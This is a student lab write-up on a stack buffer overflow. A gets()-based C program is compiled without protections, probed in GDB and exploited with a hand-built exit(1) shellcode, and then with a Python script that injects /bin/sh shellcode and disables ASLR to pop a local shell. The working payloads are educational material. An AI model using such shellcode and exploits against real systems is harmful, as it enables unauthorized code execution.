---
title: Buffer overflow to exit
date: 2024-02-24
author:
  - "0x42697262"
  - Orochi
  - Jinx
---

Authors:

- 0x42697262
- Jinx
- Orochi

# Buffer overflow to exit

## TL;DR

Open GDB

```sh
gdb vuln
```

Run the program once

```
(gdb) r
```

Then exit (CTRL+C) and dissassemble the symbol `vuln`

```
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x5655617d <+0>:     push    %ebp
   0x5655617e <+1>:     mov     %esp,%ebp
   0x56556180 <+3>:     sub     $0x8,%esp
   0x56556183 <+6>:     lea     -0x8(%ebp),%eax
   0x56556186 <+9>:     push    %eax
   0x56556187 <+10>:    call    0xf7c741b0 <_IO_gets>
   0x5655618c <+15>:    add     $0x4,%esp
   0x5655618f <+18>:    nop
   0x56556190 <+19>:    leave
   0x56556191 <+20>:    ret
End of assembler dump.
```

Add a breakpoint on the first instruction and run it once again

```
(gdb) b *0x5655617d
Breakpoint 1 at 0x5655617d: file vuln.c, line 3.
(gdb) r
Breakpoint 1, vuln () at vuln.c:3
3	void vuln() {
```

Print the address of the variable `buffer`

```
(gdb) p &buffer
$1 = (char (*)[8]) 0xffffcd18
```

Craft the exploit with the shellcode payload and memory address of the `buffer`

```
\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff
```

Execute the exploit inside GDB

```
(gdb) r <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
```

The program should terminate with the exit status code `1`

```
[Inferior 1 (process 1027954) exited with code 01]
```

---

## Introduction

A vulnerable C source code is provided that accepts an unbounded number of non-null byte characters from standard input.
The goal is to construct a **shellcode** to cause the program to terminate with a desired **exit code** of `1` using a stack smashing attack.

Note that crashes due to malformed "shellcode" will not result in an exit code of `1` and therefore will not count.

---

## Pre-requisites

### Vulnerable C Source Code

```c
// vuln.c
#include <stdio.h>

void vuln() {
    char buffer[8];
    gets(buffer);
}

int main() {
    vuln();
    while (1) {
    }
}
```

### Tools

- GNU Compiler Collection (GCC)
- GNU Debugger (GDB)
- Netwide Assembler (NASM)
- objdump

### Compilation with disabled security protections

```sh
$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack vuln.c -o vuln
```

- `-fno-stack-protector` disables stack smashing protection.
- `-m32` generate 32-bit architecture code.
- `-mpreferred-stack-boundary=2` stack boundary should be aligned in 4 bytes.
- `-ggdb` generate debug information compatible with the GDB debugger.
- `-fno-pie` disables position-independent executable (PIE) generation which randomizes the base address of the executable.
- `-z execstack` sets the stack as executable.

This compilation step is necessary otherwise it would almost be a bit harder to execute this type of buffer overflow.

```
*** stack smashing detected ***: terminated
[1]    1024635 IOT instruction (core dumped)
```

### Shellcode

Generally, we should acquire the shellcode somewhere like Shell-Storm.
But for the sake of learning, we can generate our own shellcode.
Knowledge in assembly language would be needed.
We have this shellcode that terminates the program with exit status code `1`

```asm
section .text
global main

main:
    xor eax, eax   ; Clear EAX register
    inc eax        ; Increment EAX to 1
    mov ebx, eax   ; Move the value of EAX into EBX (not %eab)
    int 0x80       ; Invoke system call
```

To compile,

```sh
$ nasm -f elf32 shellcode.asm -o shellcode.o
```

This should output an ELF LSB relocatable code `ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped`.
To acquire the shellcode to be used for the explotation payload, we can use `objdump`

```sh
$ objdump -M intel -d solutions/shellcode.o
```

Its output would be

```
solutions/shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <main>:
   0:   31 c0                   xor    eax,eax
   2:   40                      inc    eax
   3:   89 c3                   mov    ebx,eax
   5:   cd 80                   int    0x80
```

Putting all the bytes together, our shellcode is

```
\x31\xc0\x40\x89\xc3\xcd\x80
```

Which is just 7 bytes long.

## Methodology

The exit shellcode is 7 bytes long small enough to fit inside the buffer's size.
The memory address location of the `buffer` can be used as the return address where the shellcode will be stored.
The next stack after buffer is the base pointer (EBP), after the base pointer is the return address of the `vuln` function that will be modified to point to the memory address of the `buffer`.

With this, an exploit can be crafted to terminate the program with the desired exit status code of `1`.

First, run GDB with the program as the parameter

```sh
$ gdb vuln
```

And should be greeted with

```
Reading symbols from vuln...
(gdb)
```

But set the assembly language syntax first to Intel

```
(gdb) set disassembly-flavor intel
```

---

### Enumeration

Since the binary is not stripped, the function symbols can be printed.
Disassemble the `main` and `vuln` symbols in assembly language.

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x00001192 <+0>:     push    ebp
   0x00001193 <+1>:     mov     ebp,esp
   0x00001195 <+3>:     call    0x117d <vuln>
   0x0000119a <+8>:     jmp     0x119a <main+8>
End of assembler dump.

(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x0000117d <+0>:     push    ebp
   0x0000117e <+1>:     mov     ebp,esp
   0x00001180 <+3>:     sub     esp,0x8
   0x00001183 <+6>:     lea     eax,[ebp-0x8]
   0x00001186 <+9>:     push   eax
   0x00001187 <+10>:    call    0x1188 <vuln+11>
   0x0000118c <+15>:    add     esp,0x4
   0x0000118f <+18>:    nop
   0x00001190 <+19>:    leave
   0x00001191 <+20>:    ret
End of assembler dump.
```

The address of `buffer` must be known.
However, breakpoints cannot be added yet since the memory of the program is not yet allocated.

```
(gdb) run
```

And exit (CTRL+C).

Disassemble the symbols again for `vuln`

```
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x5655617d <+0>:     push    ebp
   0x5655617e <+1>:     mov     ebp,esp
   0x56556180 <+3>:     sub     esp,0x8
   0x56556183 <+6>:     lea     eax,[ebp-0x8]
   0x56556186 <+9>:     push    eax
   0x56556187 <+10>:    call    0xf7c741b0 <_IO_gets>
   0x5655618c <+15>:    add     esp,0x4
   0x5655618f <+18>:    no
   0x56556190 <+19>:    leave
   0x56556191 <+20>:    ret
End of assembler dump.
```

The proper memory addresses can now be seen.
Add a breakpoint to the first instruction `push ebp`

```
(gdb) break *0x5655617d
Breakpoint 1 at 0x5655617d: file vuln.c, line 3.
```

A `*` is needed since the address is a pointer.

Define hooks for the breakpoint

```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/16wx $esp
>end
```

These commands will automatically execute once a breakpoint is hit.
What it does is print the instruction pointer of the current function and print out the 16 bytes of the stack pointer.

Rerun the program

```
(gdb) run
=> 0x5655617d <vuln>:	push   ebp
0xffffcd24:	0x5655619a	0x00000000	0xf7c20af9	0x00000001
0xffffcd34:	0xffffcde4	0xffffcdec	0xffffcd50	0xf7e1fe2c
0xffffcd44:	0x56556192	0x00000001	0xffffcde4	0xf7e1fe2c
0xffffcd54:	0xffffcdec	0xf7ffcb60	0x00000000	0xa8a49fe9

Breakpoint 1, vuln () at vuln.c:3
3	void vuln() {
```

There are still no inputs provided here but the memory address of the `buffer` can already be acquired.

```
(gdb) print &buffer
$1 = (char (*)[8]) 0xffffcd18
```

The memory address of `buffer` is stored at `0xffffcd18` and this is where the standard input are stored.
To check, add another breakpoint on the `ret` instruction and continue the execution

```
(gdb) break *0x56556191
Breakpoint 2 at 0x56556191: file vuln.c, line 6.
(gdb) continue
Continuing.
AAAABBBBCCCCDDDDAAAABBBBCCCCDDDD
=> 0x56556191 <vuln+20>:	ret
0xffffcd24:	0x44444444	0x41414141	0x42424242	0x43434343
0xffffcd34:	0x44444444	0xffffcd00	0xffffcd50	0xf7e1fe2c
0xffffcd44:	0x56556192	0x00000001	0xffffcde4	0xf7e1fe2c
0xffffcd54:	0xffffcdec	0xf7ffcb60	0x00000000	0xa8a49fe9

Breakpoint 2, 0x56556191 in vuln () at vuln.c:6
6	}
```

The input for this was `AAAABBBBCCCCDDDDAAAABBBBCCCCDDDD` as can be seen, the bytes got replaced up until `0xffffcd37`.
The contents of the `buffer` can be checked by

```
(gdb) x/16wx &buffer
0xffffcd18:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffcd28:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffcd38:	0xffffcd00	0xffffcd50	0xf7e1fe2c	0x56556192
0xffffcd48:	0x00000001	0xffffcde4	0xf7e1fe2c	0xffffcdec
```

The first 8 bytes (`0x41414141	0x42424242`) are the buffer's contents.
The next 4 bytes (`0x43434343`) is the base pointer.
The next 4 bytes (`0x44444444`) is the return address which will be modified to point to the address of the `buffer` (at `0xffffcd18`).
This is where the shellcode will be stored.

### Exploitation

We can use any means necessary to send raw bytes to the input, but to make things simpler, we will be using `echo`.
Notice that the structure of the memory address is as follows:

```
[ 0x-------- 0x-------- ] [ 0x-------- ] [ 0x-------- ] ...
          buffer                ebp           esp
```

The payload `\x31\xc0\x40\x89\xc3\xcd\x80` can be stored on the `buffer`'s memory space

```
[ 0x8940c031 0x--80cdc3 ] [ 0x-------- ] [ 0x-------- ] ...
          buffer                ebp           esp
```

Notice that the raw bytes are stored in little-endian system.

Since the size of the payload is only 7 bytes long, NOP (no operation) instruction must be appended in order for the return address (ESP) to be modified.
The total size of the buffer and the EBP is 12 bytes.
Thus, there are 5 bytes worth of NOPs to be padded.

```
[ 0x8940c031 0x9080cdc3 ] [ 0x90909090 ] [ 0x-------- ] ...
          buffer                ebp           esp
```

The equivalent shellcode is now `\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90`.

Next is to add the memory address of the `buffer`.

```
[ 0x8940c031 0x9080cdc3 ] [ 0x90909090 ] [ 0xffffcd18 ] ...
          buffer                ebp           esp
```

Thus, the final shellcode is `\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff`.
We can store the shellcode to our `egg`

```sh
$ echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff" > egg
```

## Documentation of Proofs

To execute the exploit, run

```
(gdb) run < egg
```

or

```
(gdb) run <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
```

Which should successfully terminate the program with desired exit status

```
[Inferior 1 (process 1075597) exited with code 01]
```

---

## Conclusion

Stack smashing is an archaic method of binary exploitation that modern computers have protections against it.
Thanks to Address Space Layout Randomization (ASLR) that modern operating systems are equipped with, it would be very difficult to execute this exploit.
Nonetheless, this is a fun exercise and we have learned a lot from it.

Solution files can be found here:

- [egg](https://github.com/0x42697262/CMSC134-Writeups/blob/main/Machine_Problem_1/solutions/egg)
- [exploit.py](https://github.com/0x42697262/CMSC134-Writeups/blob/main/Machine_Problem_1/solutions/exploit.py)
- [shellcode.asm](https://github.com/0x42697262/CMSC134-Writeups/blob/main/Machine_Problem_1/solutions/shellcode.asm)
- [shellcode.o](https://github.com/0x42697262/CMSC134-Writeups/blob/main/Machine_Problem_1/solutions/shellcode.o)

---

## Acknowledgement and References

- [LiveOverflow](https://www.youtube.com/@LiveOverflow) for usage of GDB
- [Phrack Volume 7 Issue 49: Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) for teaching us on smashing the stack
- [Practical Binary Analysis](https://practicalbinaryanalysis.com/) for teaching assembly and basics of ELF
- [Shell-Storm](https://shell-storm.org/shellcode/index.html) for providing shellcodes

## Extra

### Return Me Shell!

Writing a shellcode for exit status is quite boring.
Why don't we pop a shell instead?
Since it's annoying to use `echo` to generate our shellcode, we will be using our handy scripting language... Python!

To pop a shell, we need a shellcode for it.
Thankfully, we don't need to make one from scratch (because assembly is pain y'know) thanks to Shell-Storm.

```
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

This is probably at least 40 bytes long which does not fit inside the buffer's 8 byte size.

Save the shellcode in Python and add the other stuffs as well

```python
OFFSET      = b"\x41"
EIP         = b"\x18\xcd\xff\xff"
NOP         = b"\x90"
SHELLCODE   = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

exploit     = OFFSET * 12 + EIP + NOP*4 + SHELLCODE

print(exploit)
```

And that's it!
Except this would not work because of how Python's `print()` function works.
To prove this, we will compare echo's output against Python's output

```sh
$ echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x18\xcd\xff\xff\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" > eggshell
$ xxd eggshell
00000000: 4141 4141 4141 4141 4141 4141 18cd ffff  AAAAAAAAAAAA....
00000010: 9090 9090 31c0 31db b006 cd80 5368 2f74  ....1.1.....Sh/t
00000020: 7479 682f 6465 7689 e331 c966 b912 27b0  tyh/dev..1.f..'.
00000030: 05cd 8031 c050 682f 2f73 6868 2f62 696e  ...1.Ph//shh/bin
00000040: 89e3 5053 89e1 99b0 0bcd 80              ..PS.......

$ python exploit2.py > eggshell2 && xxd eggshell2
00000000: 6222 4141 4141 4141 4141 4141 4141 5c78  b"AAAAAAAAAAAA\x
00000010: 3138 5c78 6364 5c78 6666 5c78 6666 5c78  18\xcd\xff\xff\x
00000020: 3930 5c78 3930 5c78 3930 5c78 3930 315c  90\x90\x90\x901\
00000030: 7863 3031 5c78 6462 5c78 6230 5c78 3036  xc01\xdb\xb0\x06
00000040: 5c78 6364 5c78 3830 5368 2f74 7479 682f  \xcd\x80Sh/ttyh/
00000050: 6465 765c 7838 395c 7865 3331 5c78 6339  dev\x89\xe31\xc9
00000060: 665c 7862 395c 7831 3227 5c78 6230 5c78  f\xb9\x12'\xb0\x
00000070: 3035 5c78 6364 5c78 3830 315c 7863 3050  05\xcd\x801\xc0P
00000080: 682f 2f73 6868 2f62 696e 5c78 3839 5c78  h//shh/bin\x89\x
00000090: 6533 5053 5c78 3839 5c78 6531 5c78 3939  e3PS\x89\xe1\x99
000000a0: 5c78 6230 5c78 3062 5c78 6364 5c78 3830  \xb0\x0b\xcd\x80
000000b0: 220a                                     ".

$ sha256sum eggshell eggshell2
b0200afddf57b3321ec88b73cddd7d7118fbac8cb8f9c8f781d3b1a0053367cd  eggshell
2fb5cad2ba0574d4ac536518b463de6ed4846e8f4dfa635910b71d7c1cdcc757  eggshell2
```

As you can see, the raw bytes of Python's print output is a mess.
The hash value are not the same.
Hence, Python's print function should not be used
This can be fixed by using a standard library output.

The updated code is now

```python
import sys
OFFSET      = b"\x41"
EIP         = b"\x18\xcd\xff\xff"
NOP         = b"\x90"
SHELLCODE   = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

exploit     = OFFSET * 12 + EIP + NOP*4 + SHELLCODE

sys.stdout.buffer.write(exploit)
```

Checking it once again

```sh
$ python exploit2.py > eggshell2 && xxd eggshell2
00000000: 4141 4141 4141 4141 4141 4141 18cd ffff  AAAAAAAAAAAA....
00000010: 9090 9090 31c0 31db b006 cd80 5368 2f74  ....1.1.....Sh/t
00000020: 7479 682f 6465 7689 e331 c966 b912 27b0  tyh/dev..1.f..'.
00000030: 05cd 8031 c050 682f 2f73 6868 2f62 696e  ...1.Ph//shh/bin
00000040: 89e3 5053 89e1 99b0 0bcd 80              ..PS.......

$ sha256sum eggshell eggshell2
b0200afddf57b3321ec88b73cddd7d7118fbac8cb8f9c8f781d3b1a0053367cd  eggshell
b0200afddf57b3321ec88b73cddd7d7118fbac8cb8f9c8f781d3b1a0053367cd  eggshell2
```

Both shellcodes are now equal.

Python can now be used to exploit the vulnerable binary

```sh
$ python exploit.py | ./vuln
```

This is done by piping Python's output to the input of the program.
However, this would not work and would cause an illegal instruction error

```sh
[1]    1090485 done                              python exploit2.py |
       1090486 segmentation fault (core dumped)  ./vuln
```

Because of ASLR randomizing the memory allocations everytime the program is ran.
To disable ASLR without disabling the system's protection, one can do this

```sh
$ python exploit.py | setarch $(uname -m) -R ./vuln
```

This execution may or may not work as the memory addresses in GDB compared to being ran directly are different.
This can be fixed by figuring out the exact memory address.
There are many ways to do it but the simplest one that we have already done is through GDB and attaching GDB to the process of the program.
The process of debugging with an attached process is similar.
First run the vulnerable program with `setarch` and open up another terminal with GDB by attaching to the vulnerable process

```sh
$ setarch $(uname -m) -R ./vuln
$ gdb -p <process id>
```

To find the process id, use `ps aux`.

And if this does not work, we can use `gcore` to dump the current memory of a process id and manually find our input

```sh
$ gcore <process id>
```

Run the program again and find its process id

```sh
$ setarch $(uname -m) -R ./vuln
$ ps aux | grep vuln

birb     1450296 71.4  0.0   2732  1096 pts/9    R+   10:32   5:17 ./vuln
```

Here, the process id is `1450296`.
We then dump the memory of the process after our input back in the program (I used `ABCD`)

```sh
$ gcore 1450296

[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
0x5655619a in main ()
Saved corefile core.1450296
[Inferior 1 (process 1450296) detached]
```

This will create a core file dump in binary format.
Read the coredump in hex using any hex editor tools available, we'll use good old `xxd` and pipe it to `vim`

```sh
$ xxd -g 4 core.1450296 | vim
```

Then find the input (which is `ABCD`).
There will be two results, find the memory addresses that contains the most likely data

```
...
000043c0: 00000000 00000000 00000000 00000000  ................
000043d0: 11040000 41424344 0a000000 00000000  ....ABCD........
000043e0: 00000000 00000000 00000000 00000000  ................
...
```

vs

```
...
00074f50: 00000000 2cfee1f7 0cceffff 60cbfff7  ....,.......`...
00074f60: 40cdffff 8c615556 38cdffff 41424344  @....aUV8...ABCD
00074f70: 00000000 48cdffff 9a615556 00000000  ....H....aUV....
...
```

The second result is more likely to contain the EBP and ESP.
We will use `0xffffcd48` (which is taken from `0xffffcd38` by adding 16 bytes) as the new return address

Replace the EIP in the script with the correct return address, we can now rerun the exploit

```python
$ python exploit.py | setarch $(uname -m) -R ./vuln
sh-5.2$ uname -a
Linux NuclearChicken 6.7.4-arch1-1 #1 SMP PREEMPT_DYNAMIC Mon, 05 Feb 2024 22:07:49 +0000 x86_64 GNU/Linux
```

And voila!
We got a shell!

To conclude, there is not much difference in doing this method compared to GDB aside from automating the exploitation.
The difficulty of running the program outside GDB lies on the ASLR (if enabled) and computers having allocating memory differently.
Aside from that, for the shellcode there is no need to include the NOPs.
